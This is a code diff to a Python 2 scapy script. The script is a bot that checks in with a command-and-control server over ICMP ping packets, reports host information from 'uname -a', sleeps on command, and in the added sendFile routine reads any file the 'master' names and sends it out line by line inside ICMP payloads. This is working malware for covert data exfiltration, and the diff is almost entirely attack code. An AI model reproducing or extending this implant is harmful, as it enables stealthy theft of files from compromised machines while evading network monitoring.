@@ -10,7 +10,7 @@ import sys
 import time
 import signal
 import subprocess as sub
-from scapy.all import sr,sr1,ICMP,IP
+from scapy.all import *
 
 
 def getId():
@@ -34,12 +34,35 @@ def handler(signum, frame):
         print 'Bye!'
         sys.exit()
 
-def sendPingRequest(command):
-	packet=IP(dst=sys.argv[1])/ICMP()/str(command)
-        #packet.show()
+def sendFile(filename,botId):
+	print "[*] Sending file: %s" % filename
+	file = open(filename, 'r')
+	startLine = '(FILE_START) ' + str(filename)
+	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/startLine
+	p=sr1(packet,timeout=1)
+	for line in file:
+		#print "[D] Sending line: %s" % line
+		sendLine = '(FILE) ' + filename + ' ' + line
+		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/sendLine
+		#send(packet)
+		#time.sleep(1)
+		p=sr1(packet,timeout=1)
+	print "[D] End of file"
+	finishLine = '(FILE_END) ' + str(filename)
+	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/finishLine
+	send(packet)
+
+	
+def sendPingRequest(command,botId):
+	if botId == 123456789:
+		# Initial Checkin request
+		packet=IP(dst=sys.argv[1])/ICMP()/str(command)
+	else:
+		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/str(command)
+        packet.show()
         print "[*] Request sent to C2 server: " + command
 	p=sr1(packet,timeout=10)
-        #p.show()
+        p.show()
 	if p:
 		return p
 	else:
@@ -65,9 +88,9 @@ def processReply(p):
         	print "[*] Master requesting sysinfo"
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-                id=getId()
-		sendRequest = 'sysinfo %s %s' % (str(id),output)
-		p=sendPingRequest(sendRequest)
+                botId=getId()
+		sendRequest = 'sysinfo %s' % output
+		p=sendPingRequest(sendRequest, botId)
 		if p:	
 			processReply(p)
 		#print output
@@ -76,14 +99,18 @@ def processReply(p):
 		print "[*] Thanks received"
 		print "[*] Sleeping for 10"
 		time.sleep(10)
-        elif 'sleep' in response:
+        elif 'get' in response:
+		print "[*] Master says give him %s" % response[4:]
+		botId=getId()
+		sendFile(response[4:], botId) 
+	elif 'sleep' in response:
 		seconds = response[6:]
                 print "[*] Master says sleep for %s seconds" % (seconds)
                 print "[*] Sleeping..."
                 time.sleep(int(seconds))
-		id=getId()
-		sendStr="What shall I do master? " + str(id)
-                p=sendPingRequest(sendStr)
+		botId=getId()
+		sendStr="What shall I do master?"
+                p=sendPingRequest(sendStr, botId)
                 processReply(p)
 	elif 'id=' in response:
 		print "[*] Checked in...placing id in conf file"
@@ -94,7 +121,7 @@ def main(argv):
 	if id=='null':
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-                p=sendPingRequest('Checkin %s' % output)
+                p=sendPingRequest('Checkin %s' % output,123456789)
                 if p:
                         processReply(p)
                 #print output
@@ -111,8 +138,8 @@ def main(argv):
 			exit()
 		signal.signal(signal.SIGINT, handler)
 		id = getId()
-		sendStr="What shall I do master? " + id
-		p=sendPingRequest(sendStr)
+		sendStr="What shall I do master?"
+		p=sendPingRequest(sendStr, id)
 		if p:
 			processReply(p)
 		print "[*] Sleeping now..."
